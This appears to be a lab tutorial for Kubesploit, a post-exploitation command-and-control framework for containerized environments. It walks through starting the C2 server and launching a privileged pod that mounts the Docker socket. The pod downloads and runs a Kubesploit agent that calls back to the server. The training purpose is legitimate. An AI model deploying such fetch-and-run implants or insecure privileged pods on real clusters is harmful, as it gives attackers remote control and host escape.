Here we will see the basic settings of Kubesploit.

## Basics of Kubesploit

<p align="left">
  <img src="https://github.com/cyberark/kubesploit/blob/assets/1.5x/kubesploit@1.5x-100.jpg?raw=true" width="200" height="200">
</p>



Kubesploit is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in Golang, focused on containerized environments.  
More information can be found here:  
https://github.com/cyberark/kubesploit  


#### Server

	
The server is located in the `controlplane` with a configuration file `config.yaml`.    
The server uses this file to create a listener to a given protocol, interface and port.   
The server IP that should be inside the Interface is `echo $HOST_IP`{{execute}}.  

Verify that the `config.yaml` file contains the server IP address: `cat config.yaml`{{execute T1}}

Start the server `./kubesploitServer-Linux-x64`{{execute T1}}.    
To view the menu, run `help`{{execute}}. To see the list of modules, run `use module <TAB>`.  
*You can use the `TAB` in any place to see the list commands.  


#### Agent

Let's `Open`{{execute T3}} a new terminal ("Terminal 3") on the controlplane (upper terminal) and start this vulnerable container:  
```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: priv-container
spec:
  containers:
  - name: priv-container
    image: ubuntu
    command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/cyberark/kubesploit/releases/download/v0.1.0/kubesploitAgent-Linux-x64_katacoda && chmod +x kubesploitAgent-Linux-x64_katacoda && ./kubesploitAgent-Linux-x64_katacoda -url https://$HOST_IP:443 -psk kubesploit & sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
EOF```{{execute T2}}  



Go to the master's "Terminal Host 1" and check if a new connection was received with the message "New authenticated agent checkin..".  
Once you see it, run `agent list`{{execute T1}} to see the new connection details.  

